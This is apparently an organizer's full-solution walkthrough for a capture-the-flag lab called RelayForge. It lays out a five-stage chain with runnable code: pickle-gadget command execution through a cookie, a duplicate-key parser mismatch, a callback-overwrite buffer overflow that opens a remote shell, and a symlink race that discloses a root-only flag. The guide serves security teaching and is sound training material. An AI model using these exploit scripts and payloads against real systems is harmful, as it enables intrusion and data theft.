# RelayForge beginner player and attack guide

> **Full solution spoilers:** This guide explains the complete intended path
> to the root flag. Give it to learners as a walkthrough or reveal it after
> the exercise. Do not include it in a blind competition handout unless the
> solution is meant to be open-book.

Use these instructions only against the assigned RelayForge training host.
The stack intentionally contains command execution, memory corruption, and a
privileged pathname race. Do not aim these techniques at unrelated systems.

## What the player receives

For the current EC2 deployment:

```text
Portal:   https://18.216.228.46/login
Username: guest
Password: guest-relay-2026
```

The objective is to disclose the generated flag matching:

```text
RF{32-lowercase-hex-characters}
```

The intended result is the flag, not a root shell. The final bug tricks a root
service into reading one root-only file.

An IP and login are enough to exercise the legitimate browser tunnel, but
they are not enough teaching material for a beginner to independently infer
the exact pickle gadget names, duplicate-key parser mismatch, token-gated
Worker line protocol and binary overflow payload, and 100 ms race. For a
guided exercise, also provide either:

- this walkthrough and the extracted release's `attacks/` and `web/tools/`
  files; or
- staged hints and the relevant source fragments.

The guided route assumes the player has a browser, Python 3, and an extracted
copy of the organizer/open-book source bundle. An IP and credentials alone are
enough for normal tunnel use, but not for copying the supplied exploit helpers.

## Start with the normal user path

Understand the feature before attacking it:

1. Browse to `https://18.216.228.46/login`.
2. Accept the self-signed certificate warning after checking the IP.
3. Log in as `guest` with password `guest-relay-2026`.
4. Select the available archive/echo target, keep service `echo`, choose a
   duration from 30 to 420 seconds, and submit the request.
5. Wait while the status changes from pending to approved/running.
6. Open the temporary link in a new tab.

The link resembles:

```text
http://18.216.228.46:25037/relay/<48-hex-token>/
```

Why this matters:

- HTTPS port 443 reaches nginx and Flask, not the protected endpoint.
- The private endpoint listens only on `127.0.0.1:19001` on the EC2.
- Access approves the account, Dispatcher forwards the signed job, Supervisor
  creates a short-lived Worker, and the Worker exposes one tokenized public
  port.
- The browser uses plain HTTP on that temporary port, and the Worker relays
  the request to the private endpoint.

Seeing the sample page proves the legitimate tunnel. It does not reveal the
root flag and does not mean the browser has entered the endpoint server.
`RF{browser_tunnel_success}` on that page is deliberately a fake flag.

Click **Close tunnel** on the status page before starting the attack so its
port and lifetime do not get confused with the legacy Worker created later.
Closing only the browser tab does not cancel the Worker.

## The intended attack in one picture

```text
player browser/Python
        |
        | HTTPS login + malicious remember_prefs cookie
        v
Docker: nginx -> Flask Web (UID 65532)
                         |
                         | restricted raw RPC
                         v
                 PostgreSQL request queue
                         |
                         | Access claims, evaluates, signs, returns ready job
                         v
                  PostgreSQL job queue
                         |
                         | Dispatcher claims signed job
                         v
                 Dispatcher container
                         |
                         | host-mounted Unix socket
                         v
Ubuntu host: root Supervisor -> transient Worker (UID relay)
                                      ^              |
                                      | public port  | archive request
                                      +--------------+
                                                     |
                                                     v
                              root Supervisor follows raced pathname
                                                     |
                                                     v
                                      root-only flag returned as data
```

There is no general Docker escape in this chain. Trusted services deliberately
turn an approved database job into a host systemd Worker. The attacker corrupts
that host Worker after it is launched.

The Web-container RCE never directly enters the Ubuntu host. It can only use
the Web role's restricted database RPC. Access, Dispatcher, and Supervisor then
perform their normal trusted workflow and launch the host Worker. The player
opens a separate network connection to that Worker and exploits the native
process; that is the first attacker-controlled host process.

## Fast acceptance route

The supplied end-to-end client is the easiest way to prove the challenge is
working. From an extracted release directory, run one of:

macOS/Linux:

```bash
python3 attacks/full_chain.py https://18.216.228.46
```

Windows PowerShell:

```powershell
py -3 attacks\full_chain.py https://18.216.228.46
```

The client accepts the lab's self-signed certificate by default. A successful
run reports stages resembling:

```text
[+] login: guest authenticated
[+] pickle RCE: Web UID 65532; relay_web credential recovered
[+] DB boundary: private.jobs denied to relay_web (SQLSTATE 42501)
[+] parser differential: raw request <UUID>
[+] signed job: running on port 250xx
[+] relay boundary: bidirectional tunnel reached the approved HTTP endpoint
[+] token gate: wrong rejected; valid accepted for job <UUID>
[+] Worker corruption: callback redirected via 0x...
[+] host shell: uid relay
[+] direct flag read: denied
[+] Supervisor TOCTOU: root-only flag disclosed
RF{...}
```

This is the acceptance verifier, not the best way to learn the chain. The next
sections separate the same process into understandable player actions.

## Stage 1: turn the authenticated cookie into Web command execution

The dashboard decodes a base64 `remember_prefs` cookie with a restricted
Python unpickler. The restriction permits only three preference classes, but
two of those classes form a dangerous gadget pair:

```text
JobTemplate.__setstate__ -> queues attacker-controlled command text
JobRunner.__setstate__   -> launches that text with subprocess.Popen
```

The login still matters. `/dashboard` processes the cookie only after a valid
Flask session passes `@login_required`.

Use the stage-one helper to perform one command at a time.

macOS/Linux:

```bash
python3 web/tools/exploit_stage1.py \
  https://18.216.228.46 \
  --username guest \
  --password guest-relay-2026 \
  --insecure \
  --command 'id'
```

Windows PowerShell:

```powershell
py -3 web\tools\exploit_stage1.py `
  https://18.216.228.46 `
  --username guest `
  --password guest-relay-2026 `
  --insecure `
  --command 'id'
```

Expected identity:

```text
uid=65532 gid=65532
```

This is command execution inside the Flask Web container. It is not root, the
Ubuntu `student30` account, or the Docker daemon.

Inspect the database identity made available to the Web process:

```bash
python3 web/tools/exploit_stage1.py \
  https://18.216.228.46 \
  --username guest \
  --password guest-relay-2026 \
  --insecure \
  --command 'printf "DB_USER=%s\nDB_HOST=%s\n" "$DB_USER" "$DB_HOST"'
```

The important result is `DB_USER=relay_web`. The container needs a database
password to serve the portal, so Web command execution can use that credential.
However, `relay_web` cannot directly read `private.jobs`, steal the signing
key, claim Dispatcher work, or launch a Worker.

Primitive gained: a command as Web UID 65532 plus one intentionally restricted
database capability.

## Stage 2: submit a request that two components parse differently

The public form always submits a fixed safe profile. From the Web foothold,
call the non-public raw-request RPC with a duplicated `profile` key:

```bash
python3 web/tools/exploit_stage1.py \
  https://18.216.228.46 \
  --username guest \
  --password guest-relay-2026 \
  --insecure \
  --raw-options 'profile=safe&note=quarterly&profile=legacy'
```

On Windows, use the same arguments with `py -3` and the Windows path to the
helper. Save the request UUID printed by the command.

Why the duplicate key works:

- Access validates and authorizes the **first** profile, `safe`.
- Access preserves the exact raw option string in its signed job.
- Worker interprets the **last** profile, `legacy`.
- Legacy mode enables the `LEAK` and `OVERFLOW` challenge commands.

The options cannot choose an IP, port, URL, pathname, or command. The protected
database record still fixes the tunnel destination.

While logged into the browser, open:

```text
https://18.216.228.46/connections/<REQUEST-UUID>
```

Wait for **Your tunnel is ready**, then copy the temporary link address. Record
three values from it:

```text
Worker host: 18.216.228.46
Worker port: the number from 25000 through 25099
Token:       the 48 hexadecimal characters following /relay/
```

The link should still display the private sample page. That proves this
legacy-mode Worker is a real tunnel rather than a fake success banner.

The requested lifetime is 420 seconds. Complete the Worker and race stages
before that countdown expires. If it expires, submit a new raw request and use
its new port, token, and job UUID.

Primitive gained: a signed, token-protected legacy Worker on the Ubuntu host.

## Stage 3: understand the Worker protocol

A browser request and the challenge protocol use the same listening port but
different first messages:

```text
GET /relay/<token>/... HTTP/1.1   browser tunnel
TOKEN <token>                    challenge protocol
```

Finding an open port is insufficient because the first command must contain
the request owner's random token. Start a Python 3 interactive prompt on the
player machine. Use `python3` on macOS/Linux or `py -3` on Windows:

```bash
python3
```

Enter the copied values and these statements one at a time:

```python
import re, socket, struct, time

HOST = "18.216.228.46"
PORT = 25037
TOKEN = "replace-with-the-48-hex-token"

wrong = ("0" if TOKEN[0] != "0" else "1") + TOKEN[1:]
with socket.create_connection((HOST, PORT), timeout=8) as rejected:
    rejected.sendall(f"TOKEN {wrong}\n".encode("ascii"))
    print(rejected.recv(4096).decode().strip())

s = socket.create_connection((HOST, PORT), timeout=8)

def line():
    data = bytearray()
    while not data.endswith(b"\n"):
        chunk = s.recv(1)
        if not chunk:
            raise RuntimeError("Worker closed the connection")
        data.extend(chunk)
    return bytes(data)

s.sendall(f"TOKEN {TOKEN}\n".encode("ascii"))
banner = line().decode().strip()
status = line().decode().strip()
print(banner)
print(status)
```

The first output should be `ERR auth`. Unlike a hardcoded token, changing one
character guarantees that this test token differs from the real one. The
valid connection then has this expected shape:

```text
RelayForge worker job=<JOB-UUID>
OK
```

Save the job UUID from the banner. It identifies the active transient systemd
unit and is required by the final archive request.

## Stage 4: leak the PIE address and overwrite the callback

Continue in the same Python prompt:

```python
s.sendall(b"LEAK\n")
leak = line().decode().strip()
print(leak)

match = re.fullmatch(r"worker_shell=(0x[0-9a-fA-F]+)", leak)
if match is None:
    raise RuntimeError("legacy leak was not returned")
address = int(match.group(1), 16)

payload = b"A" * 128 + struct.pack("<Q", address)
s.sendall(f"OVERFLOW {len(payload)}\n".encode("ascii") + payload)
print(line().decode().strip())
```

Why both steps are required:

- The Worker is PIE, so `worker_shell` moves when the process starts.
- `LEAK` reveals its current address only in legacy mode.
- The vulnerable frame contains a 128-byte buffer followed by an eight-byte
  callback.
- The 136-byte payload fills the buffer and replaces only that callback with
  the leaked address.
- NX, stack canaries, and full RELRO stay enabled. The attack redirects an
  existing function pointer rather than injecting executable bytes.

Expected response:

```text
relay shell opened (uid=...)
```

The socket is now attached to `/bin/sh -i` as the host `relay` user. Send a
command and read its output:

```python
s.sendall(b"id; pwd; cat /var/lib/relayforge/flag/root.txt 2>&1\n")
time.sleep(0.4)
print(s.recv(8192).decode(errors="replace"))
```

`id` should show `relay`. The direct flag read should return permission denied.
That is expected: Worker exploitation gives an unprivileged host shell, not
root.

Primitive gained: command execution as the Ubuntu host's nonlogin `relay` user
inside the active Worker systemd cgroup.

## Stage 5: exploit the Supervisor pathname race

The root Supervisor exposes a narrow `archive` operation over a Unix socket.
It accepts this operation only when the kernel reports UID `relay` and the
caller PID belongs to the active Worker cgroup for the supplied job UUID.

The archive implementation:

1. checks that `work/race.log` is a small, single-link regular file owned by
   `relay`;
2. waits 100 ms; and
3. opens that pathname again as root.

The bug is that validation and use do not share an open file descriptor.
During the delay, the attacker replaces the checked regular file with a
symlink to:

```text
/var/lib/relayforge/flag/root.txt
```

The supplied `attacks/exploit_supervisor_race.py` helper repeats this race.
It must execute through the active relay shell so that the Supervisor sees the
correct UID, PID, and Worker cgroup. The end-to-end `attacks/full_chain.py`
client transfers and invokes it automatically.

Conceptually, the command running in the relay shell is:

```bash
python3 /tmp/exploit_supervisor_race.py <JOB-UUID>
```

To transfer it manually, continue in the same local Python prompt. This
assumes the prompt was started from the extracted release root and that
`banner` and `s` still contain the values from stages 3 and 4:

```python
import base64, pathlib, re, secrets, shlex

job_id = banner.rsplit("=", 1)[1]
source = pathlib.Path("attacks/exploit_supervisor_race.py").read_bytes()
encoded = base64.b64encode(source).decode("ascii")
remote = f"/tmp/rf-race-{secrets.token_hex(6)}.py"
marker = f"__RF_DONE_{secrets.token_hex(8)}__"

command = (
    "umask 077; printf %s "
    + shlex.quote(encoded)
    + " | base64 -d > "
    + shlex.quote(remote)
    + "; python3 "
    + shlex.quote(remote)
    + " "
    + shlex.quote(job_id)
    + "; printf '\\n%s\\n' "
    + shlex.quote(marker)
    + "\n"
)
s.sendall(command.encode("utf-8"))
s.settimeout(60)

received = bytearray()
while marker.encode("ascii") not in received:
    chunk = s.recv(4096)
    if not chunk:
        raise RuntimeError("relay shell closed before returning the flag")
    received.extend(chunk)
print(received.decode(errors="replace"))

flag = re.search(rb"RF\{[0-9a-f]{32}\}", received)
if flag is None:
    raise RuntimeError("race did not win; rerun it before the Worker expires")
print(flag.group(0).decode("ascii"))
```

The long base64 value never crosses a public download service. It travels over
the already compromised Worker shell and is decoded inside that Worker's
private `/tmp` namespace.

On a winning attempt, Supervisor follows the replacement symlink as root,
base64-encodes the contents, and returns:

```text
RF{...}
```

This is a confused-deputy disclosure. The attacker does not become UID 0; the
root Supervisor performs one unintended read on the attacker's behalf.

After recording the flag, close the socket and click **Close tunnel** for the
malicious request, or let its 420-second lifetime expire. This stops the
transient Worker; it does not reset the database or rotate the flag.

## What “jumping from Docker to the host” actually means

Describe each boundary precisely:

| Stage | Where the stage occurs | How the next boundary is crossed |
|---|---|---|
| Login | Player browser or Python client | Docker publishes HTTPS to the nginx container |
| Pickle gadget | Flask Web container, UID 65532 | Web's own restricted PostgreSQL credential calls one permitted raw RPC |
| Database job | PostgreSQL container | Access independently claims the row, applies policy, and signs it |
| Signed dispatch | Dispatcher container | Dispatcher writes the signed envelope to a host-mounted Unix socket |
| Worker launch | Root Supervisor on Ubuntu | Supervisor verifies the signature and intentionally asks systemd to create a host Worker as `relay` |
| Worker exploit | Native host process, UID `relay` | Player connects directly to the temporary host port and corrupts its callback |
| Flag disclosure | Root Supervisor | The `relay` shell wins the archive race; Supervisor reads the file as root |

Therefore:

- Docker is not a machine that the attacker “jumps into.” It is the runtime
  hosting nginx, Flask, PostgreSQL, Access, and Dispatcher.
- The Web RCE starts inside a container.
- The attacker never gets a shell in PostgreSQL, Access, or Dispatcher.
- The Dispatcher-to-Supervisor Unix socket is a designed control bridge, not
  an exposed Docker socket.
- The Worker is a native host systemd service, not a sixth container.
- There is no `docker.sock` mount and no Docker escape exploit.
- The first host shell appears only after corrupting that launched Worker.
- The final transition is from unprivileged host `relay` to root-only data,
  not from `relay` to a root shell.

## Common player mistakes

- Using `http://18.216.228.46/login` instead of HTTPS. The portal is on 443.
- Browsing to `127.0.0.1:19001`. On the player's machine that means the
  player's own loopback; the EC2 endpoint is intentionally private.
- Using HTTPS on a Worker port. Temporary Worker links use plain HTTP.
- Waiting too long. A Worker expires after its requested 30–420 seconds.
- Submitting duplicate options through the public form. The form discards raw
  options; the raw RPC is reached from the Web foothold.
- Opening `CONNECT` and then trying `LEAK` on the same socket. `CONNECT`
  commits that connection to tunnel forwarding. Use a separate authenticated
  Worker connection for challenge commands.
- Assuming Web RCE is host root. It is UID 65532 in a read-only container.
- Assuming the Worker shell can directly read the flag. Permission denied is
  expected; the Supervisor race is the required final stage.
- Timing out on every `250xx` port. Ask the organizer to verify the AWS
  Security Group permits TCP `25000-25099` and that the Worker is still alive.

## Organizer hint ladder

For a discovery exercise, reveal hints gradually:

1. Inspect the authenticated `remember_prefs` cookie and Python preference
   classes.
2. A restricted unpickler is only as safe as every class it permits.
3. The compromised Web role cannot read private tables, but it can call one
   raw request function.
4. Ask whether duplicate query keys are interpreted consistently.
5. The browser URL contains a bearer token for a service that also speaks a
   line protocol.
6. Legacy Worker mode exposes a code address and a bounded callback overwrite.
7. The Worker shell is a host `relay` process in a transient systemd cgroup.
8. Review how the root Supervisor validates and later reopens `race.log`.
